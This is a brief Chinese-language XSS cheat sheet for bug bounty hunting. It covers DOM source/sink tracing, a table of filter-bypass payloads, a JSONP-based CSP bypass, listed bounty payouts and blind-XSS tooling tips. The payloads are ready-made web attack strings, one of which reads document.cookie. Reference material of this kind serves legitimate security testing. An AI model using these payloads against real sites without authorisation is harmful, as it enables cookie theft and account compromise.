# XSS 跨站脚本

## DOM XSS 方法论
1. 找所有 `source`（用户可控输入）：`location.hash`、`location.search`、`document.URL`、`window.name`、`postMessage`
2. 追踪到 `sink`（危险 DOM 操作）：`innerHTML`、`document.write()`、`eval()`、`setTimeout()`、`$()`
3. 测试 source 是否无消毒到达 sink
4. 关键指标：服务器永远看不到 payload

## 过滤绕过
| 技术 | Payload |
|------|---------|
| 标签分割 | `<scr<script>ipt>alert(1)</scr<script>ipt>` |
| Unicode 转义 | `<script>\u0061lert(1)</script>` |
| 大小写变换 | `<ScRiPt>alert(1)</ScRiPt>` |
| SVG | `<svg onload=alert(1)>` |
| Markdown 注入 | `[a](javascript:prompt(document.cookie))` |
| CSS data URI | `background-image: url("data:image/jpg;base64,<\/style><svg/onload=alert(1)>")` |

## CSP 绕过
- JSONP 端点滥用：`<script src="https://target.com/callback?cb=alert(1)//"></script>`
- AngularJS 沙箱逃逸
- `base-uri` 操纵

## 真实赏金
| 目标 | 赏金 | 技术 |
|------|------|------|
| Google | $5,000 | 存储型 XSS |
| Yahoo Mail | $10,000 | 存储型 XSS |
| Uber | $7,000 | 第三方 JS 正则绕过 |
| Facebook Messenger | $15,000 | Nonce 窃取 |

## SRC 实战要点
- **存储型 >> 反射型**（影响大，赏金高）
- 链式绕过：JSON 编码 + XSS 过滤 + WAF + CSP = 多个漏洞
- 盲 XSS 用 XSS Hunter / bXSS / ezXSS
- 管理员面板的盲 XSS 价值最高
